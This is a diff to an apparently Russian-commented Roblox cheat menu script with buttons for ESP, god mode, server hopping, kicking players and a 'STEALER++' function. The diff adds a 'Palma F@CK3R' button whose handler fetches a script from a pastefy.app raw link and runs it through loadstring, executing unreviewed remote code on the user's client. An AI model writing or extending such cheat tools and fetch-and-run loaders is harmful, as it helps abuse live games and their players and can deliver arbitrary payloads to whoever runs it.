@@ -52,8 +52,8 @@ screenGui.ResetOnSpawn = false
 -- Основной фрейм
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 300, 0, 500) -- Увеличил высоту для новой кнопки
-mainFrame.Position = UDim2.new(0.5, -150, 0.5, -250)
+mainFrame.Size = UDim2.new(0, 300, 0, 550) -- Увеличил высоту для новой кнопки
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -275)
 mainFrame.BackgroundColor3 = Color3.fromRGB(144, 238, 144)
 mainFrame.BorderSizePixel = 0
 mainFrame.ClipsDescendants = true
@@ -130,7 +130,8 @@ local button4 = createButton("StealerPlusButton", "STEALER++", UDim2.new(0, 0, 0
 local button5 = createButton("SkyWalkButton", "SkyWalk", UDim2.new(0, 0, 0, 200))
 local button6 = createButton("ServerHopButton", "ServerHop", UDim2.new(0, 0, 0, 250))
 local button7 = createButton("GodModeButton", "GodMode", UDim2.new(0, 0, 0, 300))
-local button8 = createButton("KickButton", "Kick", UDim2.new(0, 0, 0, 350)) -- Новая кнопка Kick
+local button8 = createButton("KickButton", "Kick", UDim2.new(0, 0, 0, 350))
+local button9 = createButton("PalmaFuckerButton", "Palma F@CK3R", UDim2.new(0, 0, 0, 400)) -- Новая кнопка Palma F@CK3R
 
 -- Функционал перетаскивания
 local dragging = false
@@ -720,6 +721,30 @@ local function kickPlayer()
     kickMessage:Destroy()
 end
 
+-- Функционал кнопки Palma F@CK3R
+local function runPalmaFucker()
+    button9.Text = "LOADING..."
+    button9.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+    
+    -- Запускаем внешний скрипт
+    local success, errorMessage = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/oCF131NE/raw"))()
+    end)
+    
+    if success then
+        button9.Text = "LOADED!"
+        wait(2)
+        button9.Text = "Palma F@CK3R"
+        button9.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+    else
+        button9.Text = "ERROR!"
+        warn("Failed to load Palma F@CK3R script: " .. errorMessage)
+        wait(2)
+        button9.Text = "Palma F@CK3R"
+        button9.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+    end
+end
+
 -- Функционал кнопок
 button1.MouseButton1Click:Connect(function()
     toggleBrainrotEsp()
@@ -755,6 +780,10 @@ button8.MouseButton1Click:Connect(function()
     kickPlayer()
 end)
 
+button9.MouseButton1Click:Connect(function()
+    runPalmaFucker()
+end)
+
 -- Добавляем основной фрейм на экран
 mainFrame.Parent = screenGui
 toggleButton.Parent = screenGui
@@ -772,7 +801,7 @@ local function toggleInterface()
         mainFrame.Size = UDim2.new(0, 0, 0, 0)
         
         local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-        local tween = TweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 300, 0, 500)})
+        local tween = TweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 300, 0, 550)})
         tween:Play()
     end
 end
